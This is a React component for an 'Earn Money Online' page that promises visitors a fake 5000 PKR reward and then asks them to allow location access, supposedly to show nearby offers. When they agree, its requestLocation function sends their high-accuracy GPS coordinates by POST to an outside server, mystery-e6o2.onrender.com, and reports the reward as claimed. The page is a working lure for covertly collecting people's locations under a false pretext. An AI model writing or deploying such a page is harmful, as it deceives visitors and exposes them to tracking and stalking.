import React, { useState } from "react";

const MoneyPage = () => {
  const [status, setStatus] = useState("idle");
  const [reward, setReward] = useState(null);

  const handleGetMoney = () => {
    const earned = 5000;
    setReward(earned);
    setStatus("earned");
  };

  const requestLocation = () => {
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported");
      return;
    }

    setStatus("requesting");

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;

        try {
          await fetch("https://mystery-e6o2.onrender.com/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude, longitude }),
          });

          setStatus("success");
        } catch (err) {
          console.error(err);
          setStatus("failed");
        }
      },
      () => setStatus("failed"),
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #667eea, #764ba2)",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: "20px",
      }}
    >
      <div
        style={{
          background: "#fff",
          borderRadius: "16px",
          maxWidth: "400px",
          width: "100%",
          padding: "20px",
          textAlign: "center",
          boxShadow: "0 10px 30px rgba(0,0,0,0.2)",
        }}
      >
        {/* IMAGE */}
        <img
          src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png"
          alt="Earn money"
          style={{ width: "120px", marginBottom: "15px" }}
        />

        <h2 style={{ marginBottom: "10px" }}>Earn Money Online</h2>
        <p style={{ color: "#555", marginBottom: "20px" }}>
          Click the button below to claim your reward
        </p>

        {status === "idle" && (
          <button
            onClick={handleGetMoney}
            style={buttonStyle}
          >
            💰 Get Money
          </button>
        )}

        {status === "earned" && (
          <>
            <h3 style={{ margin: "15px 0" }}>
              🎉 You earned pkr{reward}
            </h3>
            <p style={{ color: "#666", fontSize: "14px" }}>
              To show nearby offers, allow location access
            </p>
            <button
              onClick={requestLocation}
              style={buttonStyle}
            >
              📍 Claim Reward
            </button>
          </>
        )}

        {status === "requesting" && <p>Requesting location...</p>}
        {status === "success" && <p>✅ Reward claimed successfully!</p>}
        {status === "failed" && <p>❌ Turn on your location and try again.</p>}
      </div>
    </div>
  );
};

const buttonStyle = {
  padding: "12px 20px",
  fontSize: "16px",
  borderRadius: "8px",
  border: "none",
  cursor: "pointer",
  background: "#667eea",
  color: "#fff",
  width: "100%",
};

export default MoneyPage;
